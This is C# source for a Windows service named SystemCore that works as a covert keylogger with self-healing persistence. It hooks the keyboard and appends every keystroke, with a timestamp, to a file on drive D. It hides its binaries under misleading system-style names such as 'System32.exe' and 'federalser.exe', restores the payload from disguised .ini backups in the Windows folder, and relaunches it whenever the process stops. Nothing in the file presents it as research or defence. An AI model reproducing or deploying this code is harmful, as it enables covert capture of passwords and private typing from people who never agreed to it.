using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ServiceMk2
{
    public partial class SystemCore : ServiceBase
    {
        Thread mainThr;
        
        MouseKeyHook mouseKey;

        public static String NAME_SERVICE = "SystemCore";
        public static String NAME_SERVICE_EXE = "federalser.exe";
        public static String NAME_SERVICE_BACKUP = "sora.ini";
        public static String NAME_MK_EXE = "System32.exe";
        public static String NAME_MK_BACKUP = "yosuga.ini";

        public static String PATH_SERVICE_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
        public static String PATH_SERVICE_EXE = PATH_SERVICE_FOLDER + "\\" + NAME_SERVICE_EXE;
        public static String PATH_SERVICE_BACKUP_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public static String PATH_SERVICE_BACKUP_EXE = PATH_SERVICE_BACKUP_FOLDER + "\\" + NAME_SERVICE_BACKUP;

        public static String PATH_MK_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Windows Service";
        public static String PATH_MK_EXE = PATH_MK_FOLDER + "\\" + NAME_MK_EXE;
        public static String PATH_MK_BACKUP_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public static String PATH_MK_BAXKUP_EXE = PATH_MK_BACKUP_FOLDER + "\\" + NAME_MK_BACKUP;

        public SystemCore()
        {
            InitializeComponent();
            
            mouseKey = new MouseKeyHook(true, true);
            //mouseKey.mouse = true;
            mouseKey.keys = true;

            mouseKey.Key_Event += new MouseKeyHook.MouseKey_Event_Handler(keybordSpy);//Record key up event
        }

        private void keybordSpy(object sender, String keyCode)
        {
            buildLog(keyCode);
        }
        public void buildLog(String str)
        {
            System.IO.FileStream fs = new System.IO.FileStream(@"d:\_keylog.txt", System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write);
            System.IO.StreamWriter sw = new System.IO.StreamWriter(fs);
            sw.BaseStream.Seek(0, System.IO.SeekOrigin.End);
            sw.Write("[" + DateTime.Now.ToString() + "]");//Write LINE LINE
            sw.Flush();
            //foreach (String str in keyLogCol)
            {
                sw.WriteLine("[" + str + "] ");
                sw.Flush();
            }

            sw.Close();
            fs.Close();
            //keyLogCol.Clear();
        }

        void initMonit()
        {
            MonitorProcess monitor_process = new MonitorProcess();
            monitor_process.Process_Event += new MonitorProcess.Event_Handler(on_Process_Event);
            monitor_process.Process_Exit += new MonitorProcess.Event_Handler(On_Process_Exit);
            monitor_process.run();
        }

        class MonitorProcess
        {
            int sleepTime = 180;
            bool finished = false;//用于标识进程开启与否
            //委托的声明
            public delegate void Event_Handler(object sender, EventArgs strEventArg);
            //用委托声明两个事件
            public event Event_Handler Process_Event;
            public event Event_Handler Process_Exit;
            public void run()
            {
                int flag = 0;
                do
                {
                    try
                    {
                        System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
                        for (int i = 0; i < processes.Length; i++)
                        {
                            if (String.Compare(processes[i].ProcessName, "System32", true) == 0)///////////////////////////////////////
                            {
                                //Process_Event(this, new EventArgs());//产生事件
                                //finished = true;
                                flag = 1;
                                break;
                            }
                            flag = 0;
                        }

                        if (flag == 1)
                            Process_Event(this, new EventArgs());//产生事件
                        else if (flag == 0)
                            Process_Exit(this, new EventArgs());//产生事件

                        Thread.Sleep(sleepTime);
                    }
                    catch(Exception eee)
                    {
                    }

                }
                while (true);
            }

        }


        public void on_Process_Event(object sender, EventArgs strEventArg)
        {
            //EventLog.WriteEntry("on_Process_Event!");
            checkFile();

            int flag = 0;

            flag = anlReg("keySer", false);
            //The reason of Set flag to false is that we need check the flag in mkslaver,
            //because when we deploy new version ser we need stop auto service check
            //Then the flag will reset by mkslaver( Reset can through mkskaver or outer restart the service)
            if (flag == 1)
            {
                EventLog.WriteEntry("inter Stop");
                this.Stop();
            }

        }

        public void eventlog(String str)
        {
            string s = str;
            EventLog.WriteEntry(str);
        }

        //进程结束时的处理函数
        public void On_Process_Exit(object sender, EventArgs strEventArg)
        {
            int flag = 0;
            EventLog.WriteEntry("On_Process_Exit!");

            flag = anlReg("keyMk", false);
            if (flag > 0)
                Thread.Sleep(flag * 10000);
            anlReg("keyMk", true);

            checkFile();
            runMk();//If exe die run it
        }

        void checkFile()
        {
            if (!Directory.Exists(PATH_MK_FOLDER))
            {
                try
                {
                    Directory.CreateDirectory(PATH_MK_FOLDER);
                }
                catch(Exception dd)
                {

                }
            }

            //string checkMe = "";
            if (!File.Exists(PATH_MK_EXE))
                try
                {
                    EventLog.WriteEntry("recover exe");
                    System.IO.File.Copy(PATH_MK_BAXKUP_EXE, PATH_MK_EXE, true);
                }
                catch (Exception ex)
                {
                    EventLog.WriteEntry(ex.Message);
                }
            //if (!File.Exists(winPath + "//" + targetDll))
                try
                {
                    //System.IO.File.Copy(backwinPath + "//" + backDll, winPath + "//" + targetDll, true);//backup exe
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
        }

        public void runMk()
        {
            //string appPath = System.Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
            //appPath += "\\Windows Service";

            //appPath += "\\System32.exe";

            try
            {
                if (File.Exists(PATH_MK_EXE))
                {
                    Interop.CreateProcess(PATH_MK_EXE, @"C:\Windows\System32\");//THE SECOND ARGUEMENT ARE MEANINGLESS
                    //System.Diagnostics.Process.Start(PATH_MK_EXE);
                    EventLog.WriteEntry("RUN MK");
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
                EventLog.WriteEntry(ex.Message);
            }
        }

        public int anlReg(string keyname,bool reSet)
        {
            string valueName = keyname;
            int flag = -1;

            try
            {
                string[] subkeyNames;
                RegistryKey rsg = null;

                rsg = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows", true);//true表示可以修改
                subkeyNames = rsg.GetValueNames(); //判断键值的名称 //.GetSubKeyNames() -> 取得子项的名称

                foreach (string keyName in subkeyNames)
                {
                    if (keyName == valueName)
                    {
                        flag = int.Parse( rsg.GetValue(valueName).ToString() );
                        if(reSet)
                            rsg.SetValue(valueName, "0");
                        //rsg.DeleteValue(valueName, false);
                        rsg.Close();
                        return flag;
                    }
                }

                rsg.SetValue(valueName, "0");
                rsg.Close();

                return -1;
            }
            catch (Exception ex)
            {
                EventLog.WriteEntry(ex.Message);
                return -2;
            }
        }

        protected override void OnStart(string[] args)
        {
            anlReg("keySer", true);//insure exit flag are 0，avoid to dead start

            mainThr = new Thread(new ThreadStart(initMonit));
            mainThr.IsBackground = true;
            mainThr.Start();

            mouseKey.Start();

            //this.Stop();
        }


        protected override void OnStop()
        {
            //mainThr.Abort();
            //EventLog.WriteEntry("mkservice Stoped!");
        }

    }
}
